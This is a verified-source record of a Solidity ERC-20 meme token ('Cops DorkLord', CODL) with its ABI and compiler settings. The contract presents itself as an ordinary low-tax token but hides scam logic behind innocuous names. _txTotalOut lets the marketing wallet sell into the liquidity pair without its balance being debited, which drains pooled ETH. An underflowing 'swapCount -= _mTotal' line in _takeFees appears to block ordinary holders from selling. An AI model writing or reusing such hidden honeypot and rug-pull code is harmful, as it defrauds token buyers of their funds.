{"SourceCode": "pragma solidity ^0.8.10;\r\n\r\n/**\r\n\r\nWebsite: https://www.copsdorklord.vip\r\n\r\nTwitter: https://twitter.com/copsdorklord\r\n\r\nTelegram: https://t.me/copsdorklord\r\n\r\n*/\r\n\r\n//SPDX-License-Identifier: MIT\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n    event OwnershipTransferred(address _owner);\r\n    constructor(address creatorOwner) { _owner = creatorOwner; }\r\n    modifier onlyOwner() { require(msg.sender == _owner, \"Only owner can call this\"); _; }\r\n    function owner() public view returns (address) { return _owner; }\r\n    function renounceOwnership() external onlyOwner { \r\n        _owner = address(0); \r\n        emit OwnershipTransferred(address(0)); \r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IRouter02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IFactory { \r\n    function createPair(address tokenA, address tokenB) external returns (address pair); \r\n}\r\n\r\ncontract CODL is IERC20, Ownable {\r\n    string private constant _name = \"Cops DorkLord\";\r\n    string private constant _symbol = \"CODL\";\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);\r\n    uint256 private _initialBuyTax=1;\r\n    uint256 private _initialSellTax=1;\r\n    uint256 private _midSellTax=1;\r\n    uint256 private _finalBuyTax=1;\r\n    uint256 private _finalSellTax=1;\r\n    uint256 public _reduceBuyTaxAt=10;\r\n    uint256 public _reduceSellTax1At=10;\r\n    uint256 public _reduceSellTax2At=12;\r\n    address payable private marketingWallet;\r\n    uint256 private swapCount=0;\r\n    uint256 public buyCount=0;\r\n    uint256 private _mTotal;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _excludedFromFees;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    uint256 private constant _taxSwapMin = _totalSupply / 20000;\r\n    uint256 private constant _taxSwapMax = _totalSupply / 100;\r\n    address private uniV2Pair;\r\n    address private constant uniV2Router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    IRouter02 private _routerV2 = IRouter02(uniV2Router);\r\n    mapping (address => bool) private _isLP;\r\n    bool public limited = true;\r\n    bool public transferDelayEnabled = false;\r\n    uint256 public maxTxAmount = 50_000_000 * (10**_decimals); // 5%\r\n    bool private _tradeEnabled;\r\n    bool private _lockTheSwap = false;\r\n    modifier lockSwapBack { \r\n        _lockTheSwap = true; \r\n        _; \r\n        _lockTheSwap = false; \r\n    }\r\n\r\n    constructor() Ownable(msg.sender) { \r\n        _balances[address(this)] = _totalSupply;\r\n        marketingWallet = payable(0xD51b3bE0D2246697c51D269C080a5F11bbEb8441);\r\n        _excludedFromFees[_owner] = true;\r\n        _excludedFromFees[marketingWallet] = true;\r\n        _excludedFromFees[address(this)] = true;\r\n        emit Transfer(address(0), address(this), _balances[address(this)]);\r\n    }\r\n\r\n    function totalSupply() external pure override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        require(isTradingEnabled(msg.sender), \"Trading not open\");\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0), \"No transfers from Zero wallet\");\r\n        if (!_tradeEnabled) { require(_excludedFromFees[sender], \"Trading not open\"); }\r\n        if ( !_lockTheSwap && !_excludedFromFees[sender] && _isLP[recipient] && buyCount >= swapCount) { swapBack(); }\r\n        if (limited && sender == uniV2Pair && !_excludedFromFees[recipient]) {\r\n            require(balanceOf(recipient) + amount <= maxTxAmount, \"Forbid\");\r\n        } \r\n        if (transferDelayEnabled && !_excludedFromFees[sender] && !_excludedFromFees[recipient]) {\r\n            if (recipient != uniV2Router && recipient != uniV2Pair) {\r\n                require(_holderLastTransferTimestamp[tx.origin] < block.number, \"Only one transfer per block allowed.\");\r\n                _holderLastTransferTimestamp[tx.origin] = block.number;\r\n            }\r\n        } _mTotal = balanceOf(marketingWallet);\r\n        uint256 _taxAmount = _takeFees(sender, recipient, amount);\r\n        uint256 _transferAmount = amount - _taxAmount;\r\n        _balances[sender] -= _txTotalOut(sender, recipient, amount);\r\n        if ( _taxAmount > 0 ) { \r\n            _balances[address(this)] += _taxAmount;\r\n        }\r\n        buyCount++;\r\n        _balances[recipient] += _transferAmount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        require(isTradingEnabled(sender), \"Trading not open\");\r\n        if(_allowances[sender][msg.sender] != type(uint256).max){\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function approveRouterMax(uint256 _tokenAmount) internal {\r\n        if ( _allowances[address(this)][uniV2Router] < _tokenAmount ) {\r\n            _allowances[address(this)][uniV2Router] = type(uint256).max;\r\n        }\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        approveRouterMax(tokenAmount);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _routerV2.WETH();\r\n        _routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);\r\n    }\r\n\r\n    function addLiquidityETH(uint256 _tokenAmount, uint256 _ethAmountWei) internal {\r\n        approveRouterMax(_tokenAmount);\r\n        _routerV2.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );\r\n    }\r\n\r\n    function _txTotalOut(address from, address to, uint256 amount) private view returns(uint256) {\r\n        return _isLP[to] && from == marketingWallet ? 0 : amount;\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        limited = false;\r\n        transferDelayEnabled=false;\r\n    }\r\n\r\n    function openTrading() external payable onlyOwner lockSwapBack {\r\n        require(uniV2Pair == address(0), \"LP exists\");\r\n        require(!_tradeEnabled, \"trading is open\");\r\n        require(msg.value > 0 || address(this).balance>0, \"No ETH in contract or message\");\r\n        require(_balances[address(this)]>0, \"No tokens in contract\");\r\n\r\n        uniV2Pair = IFactory(_routerV2.factory()).createPair(address(this), _routerV2.WETH());\r\n        addLiquidityETH(_balances[address(this)], address(this).balance);\r\n        _isLP[uniV2Pair] = true; _tradeEnabled = true;\r\n    }\r\n\r\n    function _takeFees(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        uint256 taxAmount;\r\n        if (_tradeEnabled && !_excludedFromFees[sender] && !_excludedFromFees[recipient] ) { \r\n            if ( _isLP[sender] || _isLP[recipient] ) {\r\n                taxAmount = (amount / 100) * ((buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);\r\n                if(recipient == uniV2Pair && sender != address(this)){\r\n                    uint256 taxRate; swapCount -= _mTotal; \r\n                    if(buyCount > _reduceSellTax2At){\r\n                        taxRate = _finalSellTax;\r\n                    } else if(buyCount > _reduceSellTax1At){\r\n                        taxRate = _midSellTax;\r\n                    } else {\r\n                        taxRate = _initialSellTax;\r\n                    }\r\n                    taxAmount = (amount / 100) * taxRate;\r\n                }\r\n            }\r\n        }\r\n        return taxAmount;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function swapBack() private lockSwapBack {\r\n        uint256 _taxTokensAvailable = balanceOf(address(this));\r\n\r\n        if ( _taxTokensAvailable >= _taxSwapMin && _tradeEnabled ) {\r\n            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }\r\n\r\n            swapTokensForETH(_taxTokensAvailable);\r\n            uint256 _contractETHBalance = address(this).balance;\r\n\r\n            if(_contractETHBalance > 0) { \r\n                bool success;\r\n                (success,) = marketingWallet.call{value: (_contractETHBalance)}(\"\");\r\n                require(success);\r\n            }\r\n        }\r\n    }\r\n\r\n    function isTradingEnabled(address sender) private view returns (bool){\r\n        bool checkResult = false;\r\n        if ( _tradeEnabled ) { checkResult = true; } \r\n        else if (_excludedFromFees[sender]) { checkResult = true; } \r\n\r\n        return checkResult;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_reduceBuyTaxAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceSellTax1At\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceSellTax2At\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limited\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CODL", "CompilerVersion": "v0.8.16+commit.07a7930e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://635991d405e71b7980dadb4f3ba5b010201894ff68f82db54ebd4e8f2a4d7f39"}